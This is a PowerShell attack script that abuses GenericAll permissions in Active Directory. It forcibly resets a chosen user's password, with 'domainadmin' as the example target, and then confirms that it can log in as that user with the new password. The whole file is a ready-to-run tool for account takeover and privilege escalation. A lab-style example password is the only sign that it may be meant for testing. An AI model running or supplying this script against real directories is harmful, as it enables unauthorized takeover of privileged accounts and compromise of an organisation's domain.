<#
.SYNOPSIS
Abuses GenericAll rights to reset an AD user's password.

.DESCRIPTION
If you have GenericAll over a target user, you can reset their password to one you control.  
This script resets the password and validates access with the new credentials.

.PARAMETER TargetUser
SamAccountName of the target user (e.g., "domainadmin").

.PARAMETER NewPassword
The new password to assign to the target user.

.EXAMPLE
PS> .\attack_reset_password.ps1 -TargetUser "domainadmin" -NewPassword "Adm!nLab#2025"
#>

param(
	[Parameter(Mandatory=$true)]
	[string]$TargetUser,

	[Parameter(Mandatory=$true)]
	[string]$NewPassword
)

function Write-Ok
{ param([string]$m) Write-Host "[+] $m" -ForegroundColor Green 
}
function Write-Bad
{ param([string]$m) Write-Host "[-] $m" -ForegroundColor Red 
}
function Write-Info
{ param([string]$m) Write-Host "[*] $m" -ForegroundColor Cyan 
}

# Check AD module
if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
{
	Write-Bad "ActiveDirectory module not found (install RSAT)."
	exit 1
}
Import-Module ActiveDirectory

# Ensure target exists
try
{
	$Target = Get-ADUser -Identity $TargetUser -ErrorAction Stop
} catch
{
	Write-Bad "Target user '$TargetUser' not found."
	exit 1
}

# Attempt password reset
Write-Info "Resetting password for '$TargetUser'..."
try
{
	Set-ADAccountPassword -Identity $TargetUser -NewPassword (ConvertTo-SecureString $NewPassword -AsPlainText -Force) -Reset -ErrorAction Stop
	Write-Ok "Password reset to '$NewPassword'"
} catch
{
	Write-Bad "Password reset failed: $($_.Exception.Message)"
	exit 1
}

# Validate by binding with new credentials
try
{
	$Domain = (Get-ADDomain).DNSRoot
	$Creds = New-Object System.Management.Automation.PSCredential(
		("{0}\{1}" -f $Domain, $TargetUser),
		(ConvertTo-SecureString $NewPassword -AsPlainText -Force)
	)
	$null = Get-ADUser -Identity $TargetUser -Credential $Creds -ErrorAction Stop
	Write-Ok "Validation success: authenticated as '$TargetUser' with new password."
	exit 0
} catch
{
	Write-Bad "Validation failed: $($_.Exception.Message)"
	exit 1
}
